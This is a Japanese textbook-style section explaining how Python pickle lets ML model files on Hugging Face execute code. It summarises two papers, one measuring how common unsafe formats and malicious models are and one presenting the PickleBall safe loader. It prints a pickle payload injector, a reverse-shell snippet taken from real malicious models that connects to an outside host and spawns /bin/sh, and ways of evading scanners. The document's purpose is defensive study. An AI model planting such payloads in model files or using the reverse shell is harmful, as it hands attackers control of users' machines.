## MLモデルファイルのpickle悪用（AIサプライチェーン研究）

第5章の前半で、Python の `pickle` がなぜデシリアライズ時に任意コードを実行できるのか（`__reduce__` と `REDUCE` オペコード）を学んだ。本節では、その古典的な問題が **AI/ML のサプライチェーン**という現代的な文脈でどれほど深刻な現実問題になっているかを、2つの学術研究に沿って掘り下げる。

ML の世界では、学習済みモデル（重みやアーキテクチャ）をファイルとして配布・再利用するのが当たり前になった。その配布ハブが Hugging Face である。しかし PyTorch の `torch.save` をはじめ、ML モデルの保存形式の多くは内部で pickle を使っている。つまり**「モデルをダウンロードして読み込む」という何気ない一行 `torch.load(...)` が、信頼できない相手が仕込んだ Python コードの実行になりうる**。これは「AI サプライチェーン攻撃（AI supply chain attack）」の中核をなす攻撃面であり、防御側（モデルを利用する開発者・MLOps 運用者）が理解すべき最重要トピックだ。

本節では次の2本の研究を扱う。

1. Casey, Santos & Mirakhorli, *A Large-Scale Exploit Instrumentation Study of AI/ML Supply Chain Attacks in Hugging Face Models*（arXiv:2410.04490）— **どれほど蔓延しているか**の大規模実測。
2. Kellas et al., *PickleBall: Secure Deserialization of Pickle-based Machine Learning Models*（arXiv:2508.15987）— **どう安全に読み込むか**の防御手法研究。

> ⚠️ **注記**: 本節は防御目的の解説である。攻撃コードは「なぜ危険か」を理解するための最小限の原理説明にとどめ、実在サービスや本番環境への無許可の検証手順は一切書かない。学習済みモデルは常に「未検証の実行可能ファイル」として扱う、という防御的な心構えを身につけるのが目的だ。

---

### 前提知識の確認：なぜ ML モデルファイルでコード実行が起きるのか

まず仕組みを再確認する。pickle は**スタックベースの仮想マシン（Pickle Machine, PM）**で、バイナリ列に埋め込まれた**オペコード（opcode: PM が1つずつ解釈する命令コード）**を順に実行してオブジェクトを復元する。PM のオペコードには2種類あり、ここが危険の源泉である。

- **ネイティブ型を作る命令**：`NEWFALSE`（bool を作る）など。無害。
- **Python の callable（関数やクラス）を輸入・呼び出す命令**：
  - `GLOBAL` / `STACK_GLOBAL` … callable の名前（例: `os.system`）を受け取り、それを**import してスタックに積む**（＝importing opcode）。
  - `NEWOBJ` … クラスの `__new__` を呼んでインスタンスを確保する（allocating opcode）。
  - `REDUCE` … スタックから「関数」と「引数」を取り出して**関数を呼ぶ**（invoking opcode）。戻り値をスタックに積む。
  - `BUILD` … オブジェクトの属性を設定・変更する（building opcode）。

攻撃者から見れば、`GLOBAL` で `os.system` を import し、`REDUCE` で `("ls",)` を引数に呼ぶ、というオペコード列を書くだけで任意コマンドが走る。この一連の流れを開発者側から生み出す正規の仕組みが `__reduce__` メソッドである。オブジェクトを pickle 化するとき、Python は `__reduce__` を呼び、その戻り値 `(関数, 引数)` をオペコードとして書き出す。デシリアライズ時にはその関数が引数付きで呼ばれる——**これが「任意関数を呼ぶプリミティブ」そのもの**だ。

PickleBall 論文は、ML ライブラリが実際にこの仕組みを正規用途で使っている例を示している。

```python
import pickle

def read_weights_to_tensor(filename: str) -> Tensor:
    # 重みファイルを読んで Tensor を返す正規の関数
    ...

class Tensor(object):
    ...
    def __reduce__(self):
        # デシリアライズ時に read_weights_to_tensor(self.filename) を呼ばせる
        return (read_weights_to_tensor, (self.filename,))

class Model(object):
    def __init__(self, weights: library.Tensor):
        self.weights = weights
    @classmethod
    def load(cls, path):
        with open(path, 'rb') as fd:
            return pickle.load(fd)   # ← ここが sink（入力が最終的に実行される危険な地点）
```

> 出典: PickleBall: Secure Deserialization of Pickle-based Machine Learning Models — https://arxiv.org/abs/2508.15987

**ポイントは「正規の `__reduce__`」と「悪意ある `__reduce__`」を pickle のレベルで区別できない**ことだ。`read_weights_to_tensor` を呼ぶのも `os.system` を呼ぶのも、PM にとっては同じ「`GLOBAL` + `REDUCE`」でしかない。だからこそ、pickle をそのまま読み込む限り、モデルファイルは**署名なしの実行可能ファイル**に等しい。

安全な代替として Hugging Face が2022年9月に公開した **SafeTensors** 形式がある。これはテンソル（重みの数値配列）だけをエンコードし、callable を呼ぶオペコードを一切持たない。表現力を意図的に絞ることで安全性を得ているが、その代償としてモデルの**アーキテクチャや学習状態、カスタムオブジェクト**は保存できない。この「安全 vs 表現力」のトレードオフが、後述する pickle が消えない根本原因になる。

---

### 研究1：Hugging Face 上の大規模実測 — 「59% が危険形式、14件が実際に悪意モデル」

Casey らの研究（arXiv:2410.04490, ノートルダム大／ハワイ大, 2024）は、**「AI モデルハブにおける安全でないシリアライズがどれほど蔓延し、実際に悪用可能か」を初めて大規模に実測**した論文である。

> ⚠️ **未取得の資料**: 本論文の PDF（https://arxiv.org/pdf/2410.04490 ）は自動テキスト抽出で一度失敗したが、ローカル保存された PDF から本文全文を抽出でき、以下は**原典本文からの直接引用に基づく**（数値・コードとも原典どおり）。原本は上記 URL からも直接ご覧いただける。

#### 研究設問（RQ）と方法

論文は4つの研究設問を立てた。

- **RQ1**: Hugging Face で最も使われているシリアライズ形式は？
- **RQ2**: そのうちどれだけが実際に悪用（exploit）可能か？
- **RQ3**: Hugging Face 純正のセキュリティスキャナはどこまで検知できるか？
- **RQ4**: 意図的に悪意あるモデルは実在するか、何件あるか？

対象は Hugging Face の **4,023 リポジトリ、計 22,834 個のモデルファイル**。形式判定は拡張子とファイルのマジックバイト／内部文字列で行った（例: ファイル内に `dill._dill\x94\x8c` があれば Dill、`joblib.` があれば JobLib、それ以外の pickle 系は Pickle と判定）。

論文が整理した「安全でない」シリアライズ形式の一覧が重要だ。**Dill・JobLib・`torch.save`（PyTorch）はすべて内部で pickle を使う**ため危険、ONNX（protobuf ベース）や H5/HDF5（Keras）も別経路で危険、安全なのは **SafeTensors のみ**という位置づけである。

#### RQ1 の結果：59% が安全でない形式

> 22,834 ファイルのうち安全な形式（SafeTensors）は 9,368 件だけで、**13,466 件（59%）が安全でないシリアライズ形式**を使っていた。

内訳（安全でない形式の分布）は次のとおり。

| 形式 | ファイル数 |
|---|---|
| PyTorch（`torch.save`, pickle ベース） | 8,058 |
| NumPy | 2,357 |
| ONNX | 1,919 |
| H5/HDF5 | 581 |
| Pickle（素） | 539 |
| Joblib | 7 |
| TorchScript | 5 |

**なぜ PyTorch が圧倒的多数なのか**：`torch.save` は PyTorch の標準保存 API で、内部で pickle を使う。PyTorch は使いやすさ・柔軟性から ML で最も普及しているため、その標準機能がそのまま最大の攻撃面になっている。SafeTensors への移行は進みつつあるものの、依然として過半数が危険形式のままだ、というのが RQ1 の結論である。

#### RQ2 の結果：96% が実際に悪用可能

論文は「実測」を名乗るだけあり、実際に悪用可能かを**攻撃計装（exploit instrumentation）**で検証した。手法の核心は「悪意ある Pickler を自作し、正規モデルを再シリアライズする際にペイロードを先頭に注入する」ことである。原典 Listing 1 の中核を防御理解のために引用する（`exploit.txt` に `HACKED` と書くだけの無害ペイロードで検証している点に注目）。

```python
class Payload:
    def __reduce__(self):
        cmd = ("with open('{save_path}', 'w') as f:"
               " f.write('HACKED')")
        return (exec, (cmd,))   # デシリアライズ時に exec(cmd) が走る

class MaliciousPickler(pickle._Pickler):
    def dump(self, obj):
        # プロトコルヘッダを書いたあと…
        self.save(Payload())   # ← ペイロードを「先頭」に注入
        self.save(obj)         # 続いて本来のモデルを保存
        self.write(pickle.STOP)
```

**なぜ先頭に注入するのか**：pickle はオペコードを**順に**実行し `STOP` で止まる。ペイロードを先頭に置けば、モデル本体が復元される前に `Payload.__reduce__` が生成した `exec(cmd)` が実行される。`torch.save` の場合は `pickle_module` パラメータにこの `MaliciousPickler` を渡すだけで、PyTorch モデルにも同じ注入ができる——これが「正規 API がそのまま攻撃に使える」ことの実証だ。

結果：悪用手法が対応する 10,528 ファイル（Pickle・JobLib・Dill・PyTorch・ONNX）のうち **10,096 件（96%）を実際に悪用できた**。失敗の主因は「必要な外部ライブラリ（例: `accelerate`）が未インストールでモデル自体を読み込めなかった」ケースで、pickle の仕組み上の防御が効いたわけではない。

なお ONNX・TorchScript は経路が異なる。ONNX は**モデルのメタデータに `action` キーを仕込み、読み込み側が `exec()` する**方式（`__reduce__` は使わない、やや露骨な手口）。TorchScript は `torch.jit.save` の `_extra_files` パラメータにメタデータを同梱する方式。H5/HDF5（Keras）は **Lambda レイヤ**（任意の関数をレイヤとして包む機能）にペイロードを埋める。Keras 2.13 以降は Lambda 関数の定義を読み込み側ファイルに要求するようになったが、攻撃者は「モデルを読み込むスクリプトごと配布し、その中に悪意ある lambda を書く」ことで回避できる、と論文は指摘する。

#### RQ3 の結果：純正スキャナは 62% を見逃す

Hugging Face には pickle をスキャンして危険な import（`exec` や `eval` など）を警告する機能がある（重大度に応じて赤・橙・灰でフラグ表示）。しかし——

> 13,466 件の危険形式ファイルのうち、スキャナがフラグを立てたのは **5,137 件（38%）のみ**。**8,329 件（62%）は見逃された**。

見逃しの根本原因は明快だ。このスキャナは**「pickle 系形式」しか対象にしていない**。NumPy（2,357 件見逃し）・ONNX（1,919 件見逃し）・H5/HDF5（581 件見逃し）といった非 pickle の危険形式は、そもそもスキャン対象外なのである。しかも pickle 対象でも「既知の危険 import を探す**デニーリスト（拒否リスト）**方式」なので、リストにない callable を使われれば素通りする。

#### RQ4 の結果：実在した 14 件の悪意モデル

最も注目すべき結果だ。論文は `sys.settrace`（Python の呼び出しトレース）と `strace`（システムコールトレース）を組み合わせた**動的トレーサ**を作り、モデル読み込み時に実際に何が呼ばれるかを観測した。

> 12,973 ファイルを解析し、トレーサが 86 件をフラグ。精査の結果、**14 件が本物の悪意あるモデル**だった。うち **9 件（64%）が外部ソケットに接続**（＝リバースシェル／バックドア）、3 件がブラウザを開いてメッセージを表示し `sys.modules` から痕跡を消去、1 件が `ls`、1 件が `echo 'pwnd!'`。

9 件のソケット接続モデルはホスト・ポートこそ違えど**中身は同一のリバースシェルコード**だった。原典 Listing 2 の中核（防御理解のため。これは攻撃者が実際に Hugging Face 上に置いていたバックドアの構造だ）：

```python
def a():
    import socket, pty, os
    s = socket.socket()
    s.connect((RHOST, RPORT))                 # 攻撃者サーバへ接続
    [os.dup2(s.fileno(), fd) for fd in (0,1,2)]  # 標準入出力をソケットに差し替え
    pty.spawn("/bin/sh")                      # シェルを起動 = リバースシェル成立
threading.Thread(target=a).start()
```

**なぜ動的トレーサが必要だったか**：静的なデニーリスト（Hugging Face 純正スキャナ）は、あるモデルを「`builtins.exec` を使用」とフラグしただけで、それがバックドアを張る危険な挙動だとは伝えられなかった。何が import されるかではなく**何が実際に呼ばれ、どんなシステムコールが飛ぶか**を見て初めて、リバースシェルという本質が見える。一方でトレーサにも 72 件の偽陽性があった（ソケットを `bind` して即 `close` するだけのモデル。バインド先が `::1`＝ループバックなので TCP/IP スタックのテスト用と判断できる）。

コメントに「`# just to be extra sneaky, let's clean up...`（さらにこっそりやるため、痕跡を消そう）」と書かれたモデルもあり、攻撃者が**検知回避（難読化）を試行錯誤している**様子が観測された点も示唆的だ。

#### 研究1 の防御的示唆

- **SafeTensors が第一選択**だが、テンソル以外（アーキテクチャ・学習状態・カスタムオブジェクト）を保存できず、後方互換のために `torch.save` が使われ続けるという技術的制約がある。だから「SafeTensors を使え」だけでは解決しない。
- **ハブ純正スキャナを過信しない**。pickle 系しか見ず、デニーリスト方式で 62% を見逃す。ダウンロードしたモデルは**サンドボックス／隔離環境で読み込む**、可能なら重みだけを SafeTensors に変換してから使う、といった多層防御が要る。

> 出典: A Large-Scale Exploit Instrumentation Study of AI/ML Supply Chain Attacks in Hugging Face Models — https://arxiv.org/abs/2410.04490 / https://arxiv.org/pdf/2410.04490

---

### 研究2：PickleBall — 「安全かつ使える」pickle 読み込みへ

研究1が「問題の広さ」を測ったのに対し、Kellas ら（Columbia／Brown／Purdue／Google／Technion, arXiv:2508.15987, v2 2025年9月）の **PickleBall** は「では**どうやって pickle モデルを安全に読み込むか**」に踏み込む。既存防御の限界を分析したうえで、新しい防御機構を提案・実装・評価した論文である。

#### なぜ既存防御では不十分なのか

PickleBall はまず、既存の2系統の防御が抱える欠陥を実測で示す。

**(A) モデルスキャナ（picklescan, ProtectAI/ModelScan）** — デニーリスト方式。危険な callable の一覧に該当すれば警告する。しかしデニーリストは本質的に**網羅できず、回避される**。論文は実際に、スキャナが見逃す callable を使うモデルと、許可された callable を**間接的に呼ぶ**モデルの2種を作り、ModelScan と別スキャナを回避してみせた（Appendix B）。評価では ModelScan は 84 件の悪意モデルのうち **9 件を良性と誤判定（偽陰性）**。誤判定の内訳は、(1) デニーリストにない callable でペイロードを実装（5件）、(2) `numpy.load()` 等で追加ペイロードを動的に読み込みスキャナが静的に追えない（3件）、(3) **複数の `STOP` オペコード**を使い、最初の `STOP` でスキャナが解析を打ち切って残りを見逃す（1件）——といずれも「不完全なデニーリスト」の限界を突いている。

**(B) 制限付きローダ：PyTorch weights-only unpickler** — こちらは逆に**アローリスト（許可リスト）方式**。PyTorch 1.13（2022年11月）で導入され、**PyTorch 2.6（2024年11月）から `torch.load` のデフォルト**になった。安全な PyTorch API の小さな許可集合に属する callable しか呼べないようにする。悪意モデルはすべてブロックできる（偽陰性ゼロ）が、**許可集合が PyTorch 標準向けに固定**されているため、それ以外の callable を使う正規モデルが読めない。

PickleBall はこの usability 問題を実測した。人気 pickle-only リポジトリ 1,426 件を `fickling`（pickle を静的にトレースするツール）で調べたところ——

> **219 件（15.4%）が、weights-only unpickler では読み込めない**（許可外の callable を含む）モデルを1つ以上抱えていた。この 219 件は調査最終月だけで**合計 7,960 万回ダウンロード**されており、36 種の許可外 callable（numpy や Transformers 由来が多い）が現れた。

具体例が `flair/ner-english-fast`（英語固有表現抽出、100万 DL 超の**良性**モデル）だ。flair ライブラリは weights-only unpickler の許可集合に無い callable を使うため、**ライブラリ側が weights-only を明示的に無効化**している。結果、利用者は弱いスキャナと自分の目視判断に頼るしかなく、実際 Hugging Face のスキャナは（良性なのに）「一部の import が疑わしい」と警告を出す。**「安全にしようとすると読めない、読もうとすると危険」**というジレンマそのものだ。

#### PickleBall のアイデア：ライブラリのソースから「あるべき挙動」を静的に導く

PickleBall の核心的な発想は次のとおり。

> 良性なモデルが読み込み時にどんな callable を呼ぶかは、**そのモデルを作った ML ライブラリのソースコードに書いてある**。ならば、ライブラリを静的解析して「このライブラリのモデルを復元するときに正当に現れうる callable の集合」を**自動生成したポリシー（許可リスト）**として抽出し、読み込み時にそれだけを許可すればよい。

これは weights-only の固定アローリストと違い、**ライブラリごとに最適化された許可リスト**を作る点が新しい。動作は2フェーズ。

**フェーズ1：ポリシー生成（オフライン、一度きり）**

対象 ML ライブラリと、読み込むモデルのクラス定義を入力に、**AST（抽象構文木）**上で静的解析（実装は Joern フレームワーク＋独自の Scala コード約1,300行）を行い、次の2つの集合からなるポリシーを出力する。

- **Allowed Imports（許可 import）**: 生成されうるオブジェクトの型。
- **Allowed Invocations（許可呼び出し）**: 正当に呼ばれうる関数。

アルゴリズム（Algorithm 1）は、対象クラスに `__reduce__` があれば**その戻り値の型・関数を許可集合に加え**、戻り値の型をさらに解析対象に追加して再帰的にたどる（`GetReduceReturnTypes` / `GetReduceReturn`）。つまり「このクラスを pickle 化したら、どんな `(関数, 引数)` が書き出され、復元時に何が呼ばれるか」をソースから推論するわけだ。冒頭の `Tensor.__reduce__` の例なら、`read_weights_to_tensor` が Allowed Invocations に、`Tensor` が Allowed Imports に入る——`os.system` は当然入らない。

**フェーズ2：ポリシー適用（読み込み時、pickle の drop-in 置き換え）**

生成ポリシーを PM に適用する。標準 `pickle` モジュールの差し替えとして動く。

- importing opcode（`GLOBAL` 等）は Allowed Imports にある callable しか触れない。
- allocating opcode は許可された型の `__new__` しか呼べない。
- invoking opcode（`REDUCE` 等）は**除去されるか、Allowed Invocations に限定**される。

巧妙な防御が2点ある。第一に、**「import は許可されているが invocation は許可されていない callable」を、`BUILD` オペコードで `__name__`／`__module__` を書き換えて別の許可 callable に「なりすます」攻撃**を想定し、building opcode によるこれらの属性変更を禁止している。第二に、静的解析は Python の動的な性質（実行時の属性書き換え・動的型付け）ゆえに完璧にはなれない（＝ポリシーが不完全＝正当な callable を取りこぼしうる）。この副作用を吸収するのが**遅延適用（lazy enforcement）**だ。

> 許可外の import に出会ったら**即座に例外を投げず、スタブオブジェクト（何もしないダミー。呼ばれる／アクセスされると初めて例外を投げる）**を代わりに作る。そのスタブが最後まで使われなければ読み込みは成功し、実際に呼ばれたときだけ違反として弾く。

**なぜ遅延適用が効くのか**：モデルには「初期化時に属性として持つが、その後のロード・推論では一切使わないメタデータ」が多い。取りこぼした callable がそういう死蔵メタデータなら、スタブのまま無害に読み込みが完了する。一方で、攻撃者が「返り値オブジェクトのメソッドを許可外 callable で上書きし、後で呼ばせる」手口を使っても、スタブが**アクセス時に例外を投げる**ので防げる。

#### 評価結果

論文は **336 モデルのデータセット**（Hugging Face 収集の良性 252 件＋実在・合成の悪意 84 件）で評価した。

- **悪意モデルのブロック（RQ1）**: 生成された全ポリシーで、**84 件すべて（100%）の悪意モデルのペイロード実行を阻止**。理由は単純で、生成ポリシーには `eval()` や `system()` のような危険 callable が最初から含まれないため、読み込み時に例外が出る。
- **良性モデルの読み込み（RQ2）**: **79.8% の良性モデルを正しく読み込み・推論**できた（16 の人気ライブラリ——flair, YOLOv5/v11, sentence_transformers, PyAnnote など——で検証）。失敗要因は静的解析の限界に起因し、(a) 初期化後に動的にセットされる属性の型を取りこぼす、(b) 推論中に**追加の pickle 読み込み**が発生（MeloTTS 2件）、(c) ライブラリのバージョンドリフト（後方互換用の未使用スタブクラス）、(d) 名前空間の不整合（`yolov5.models.common.Conv` vs `models.common.Conv`）——など。lazy enforcement で読み込めた「スタブ入りモデル」も、より厳密なデータセット（NER、AISHELL-4 音声、COCO 画像等）で追試したところ、**通常の PM と同一の推論結果**を返し、スタブへのアクセスによる違反は起きなかった。
- **性能（RQ3）**: ポリシー生成はオフラインの一度きりコスト。読み込み時のオーバーヘッドも実用的な範囲。
- **既存手法との比較（RQ4）**: 下表が要点。

| 手法 | 方式 | 悪意モデルの偽陰性 | 良性モデルの誤ブロック |
|---|---|---|---|
| ModelScan | 静的デニーリスト | 9 件見逃し（10.7%） | 0 |
| ModelTracer | 動的デニーリスト | 40 件見逃し（47.6%） | 0 |
| weights-only unpickler | 固定アローリスト | 0 | **95 件**（37.7%） |
| **PickleBall** | 生成アローリスト | **0** | **51 件**（20.2%） |

読み方：スキャナ（ModelScan/ModelTracer）は良性を弾かない代わりに**悪意を取りこぼす**（デニーリストの宿命）。weights-only と PickleBall はどちらも**悪意を100%阻止**するが、良性の読み込みで差が出る——weights-only は 95 件も誤ブロックするのに対し PickleBall は 51 件で、**PickleBall の方が多くの良性モデルを読める**。要約すると論文の主張は「**state-of-the-art（weights-only）より 22% 多くの良性モデルを読み込みつつ、悪意モデルは 100% ブロックする**」だ。

#### 残る攻撃面と限界（防御の心構え）

PickleBall 自身が明言する限界は正直で重要だ。PickleBall は「**任意 callable の import・invoke**」という強力なプリミティブを奪うが、**許可された callable を想定外の順序・引数で組み合わせる攻撃（return-to-libc やコード再利用に類する手口）までは防げない**。現時点でそうした攻撃は観測されていないが、「許可リストに入った正規部品だけで悪さができないか」は未解決の研究課題として残る。また静的解析は Python の動的性ゆえに**健全（sound）にも完全（complete）にもなりきれない**（過大近似＝余分に許可、過小近似＝正当を取りこぼし）。PickleBall は allowed imports と allowed invocations を分離し、かつ lazy enforcement を入れることでこれらを緩和している。

> 出典: PickleBall: Secure Deserialization of Pickle-based Machine Learning Models — https://arxiv.org/abs/2508.15987

---

### まとめ：ML モデルは「未署名の実行可能ファイル」として扱う

2本の研究から、防御側が持ち帰るべき教訓を整理する。

1. **蔓延の実態**：Hugging Face のモデルファイルの **59%（研究1）／リポジトリの ~44.9%（研究2）** が pickle 系の危険形式。pickle モデルを含むリポジトリは**月間 21 億回超**ダウンロードされ、Meta・Google・Microsoft・NVIDIA・Intel を含む 500 以上のモデルが pickle のみで配布されている。ある研究では悪意モデルのアップロードが**前年比 5 倍に増加**。危険形式は「レガシーだから消える」どころか増えている。
2. **実害は現実**：研究1 は実在する **14 件の悪意モデル**（うち 9 件がリバースシェル）を発見。「理論上の脆弱性」ではなく、攻撃者が検知回避まで試行している実運用の攻撃面だ。ペイロードには**システム指紋採取・認証情報窃取・リバースシェル**が確認されている。
3. **既存防御の限界を知る**：
   - **ハブ純正スキャナ／デニーリスト**（picklescan, ModelScan）は pickle 系しか見ず、リストにない callable・間接呼び出し・複数 `STOP` などで回避され、**62%（研究1）を見逃す**。過信禁物。
   - **SafeTensors** は根本解だが、テンソル以外を保存できず後方互換で pickle が残る。
   - **weights-only unpickler**（PyTorch 2.6 以降デフォルト）は悪意を100%止めるが、**15.4% の人気リポジトリで正当なモデルが読めなくなる**。無効化されると元の木阿弥。
4. **前進する防御**：**PickleBall** のように「ライブラリのソースから許可リストを自動生成し、遅延適用で運用性を保つ」アプローチが、安全性（悪意 100% 阻止）と実用性（良性 79.8% 読み込み）を両立させつつある。ただし code-reuse 型の残存攻撃面は未解決。

実務的な推奨は多層防御に尽きる。**(1) 可能な限り SafeTensors を使う／要求する。(2) pickle モデルは信頼できる発行元だけを、隔離・サンドボックス環境で読み込む。(3) `torch.load` は `weights_only=True`（PyTorch 2.6 以降デフォルト）を維持し、無効化するモデルは特に警戒する。(4) スキャナの警告は「無いより増し」程度に受け止め、単独の防御線にしない。** 学習済みモデルは、便利な数値データではなく**署名検証のない実行可能ファイル**だ——この一点を組織の常識にすることが、AI サプライチェーン防御の出発点になる。
